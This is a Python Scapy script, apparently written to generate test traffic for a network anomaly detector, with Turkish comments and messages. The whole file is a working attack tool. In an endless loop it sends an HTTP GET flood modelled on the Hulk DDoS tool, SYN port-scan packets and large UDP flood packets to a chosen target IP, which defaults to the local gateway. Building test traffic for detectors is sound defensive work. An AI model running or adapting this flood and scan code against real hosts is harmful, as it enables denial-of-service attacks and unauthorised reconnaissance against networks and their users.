import os
import time
import random
import sys
import argparse

from scapy.all import IP, TCP, UDP, Raw, conf, send
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

def _guess_default_gateway_ip() -> str | None:
    """Best-effort gateway detection.

    Scapy route tuple on Windows is typically (iface, src_ip, gw_ip).
    When gw_ip is 0.0.0.0, the destination is on-link.
    """
    try:
        _iface, _src, gw = conf.route.route("1.1.1.1")
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        return None
    return None


parser = argparse.ArgumentParser(description="Attack traffic generator for the anomaly detector")
parser.add_argument(
    "--target",
    "-t",
    default=os.getenv("TARGET_IP") or _guess_default_gateway_ip() or "192.168.1.1",
    help="Target IP to send packets to. Default: env TARGET_IP, else gateway, else 192.168.1.1",
)
parser.add_argument(
    "--sleep",
    type=float,
    default=float(os.getenv("ATTACK_SLEEP", "0.001")),
    help="Delay between iterations in seconds (default 0.001 to reduce CPU burn)",
)
parser.add_argument(
    "--fixed-flow",
    action="store_true",
    help="Use a consistent 5-tuple for flood traffic (more likely to look like a single high-volume attack flow)",
)
parser.add_argument(
    "--dst-port",
    type=int,
    default=int(os.getenv("ATTACK_DST_PORT", "80")),
    help="Destination port for the flood traffic when --fixed-flow is enabled (default 80)",
)
parser.add_argument(
    "--src-port",
    type=int,
    default=int(os.getenv("ATTACK_SRC_PORT", "40000")),
    help="Source port for the flood traffic when --fixed-flow is enabled (default 40000)",
)
parser.add_argument(
    "--print-every",
    type=int,
    default=int(os.getenv("ATTACK_PRINT_EVERY", "500")),
    help="Print status every N packets (default 500)",
)
args = parser.parse_args()

TARGET_IP = args.target
SLEEP_SEC = max(0.0, args.sleep)
FIXED_FLOW = bool(args.fixed_flow)
FIXED_DST_PORT = int(args.dst_port)
FIXED_SRC_PORT = int(args.src_port)
PRINT_EVERY = max(1, int(args.print_every))

print("\n" + "!"*60)
print("⚔️  GELİŞMİŞ SALDIRI SİMÜLASYONU (DDoS Hulk & PortScan Taklidi)")
print(f"🎯 Hedef: {TARGET_IP} (Dış Trafik)")
if _guess_default_gateway_ip() and TARGET_IP == _guess_default_gateway_ip():
    print("   (Varsayılan: gateway seçildi; Wi-Fi/Ethernet capture için ideal)")
print("!"*60 + "\n")
print("Durdurmak için CTRL+C yapın.\n")

time.sleep(2)

try:
    packet_count = 0
    while True:
        # Port selection
        if FIXED_FLOW:
            dst_port = FIXED_DST_PORT
            src_port = FIXED_SRC_PORT
        else:
            dst_port = random.randint(1, 65535)
            src_port = random.randint(1024, 65535)
        
        # --- TAKTİK 1: HULK DDoS Taklidi (HTTP GET Flood) ---
        # Model 'Payload Length' ve 'TCP Flags'e bakar.
        # User-Agent ve karmaşık URL ekleyerek gerçekçi yapıyoruz.
        http_payload = (
            f"GET /?id={random.randint(1,999999)} HTTP/1.1\r\n"
            f"Host: {TARGET_IP}\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Keep-Alive: 300\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        
        # PUSH ve ACK bayraklarını kullan (Veri taşıyan paket)
        tcp_hulk = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=dst_port if FIXED_FLOW else 80, flags="PA", seq=random.randint(1000,9000))/Raw(load=http_payload)
        
        # --- TAKTİK 2: PortScan (SYN Scan) ---
        # Sadece SYN bayrağı, payload yok, hızlı ve kısa.
        tcp_scan = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=dst_port, flags="S")

        # --- TAKTİK 3: UDP Flood (Büyük ve Anlamsız) ---
        udp_payload = "X" * random.randint(800, 1400) # Değişken boyutta
        udp_flood = IP(dst=TARGET_IP)/UDP(sport=src_port, dport=dst_port)/Raw(load=udp_payload)

        # Paketleri Yolla (Verbose=0)
        # Hepsini aynı anda yolluyoruz ki trafik karmaşıklaşsın
        send(tcp_hulk, verbose=0)
        send(tcp_scan, verbose=0)
        send(udp_flood, verbose=0)
        
        packet_count += 3
        
        # Terminale Durum Yaz
        if packet_count % PRINT_EVERY == 0:
            print(f"🔥 {packet_count} Saldırı Paketi Gönderildi... -> Dashboard'a Bak!", end="\r")
        
        if SLEEP_SEC:
            time.sleep(SLEEP_SEC)

except KeyboardInterrupt:
    print("\n\n🛑 Saldırı durduruldu.")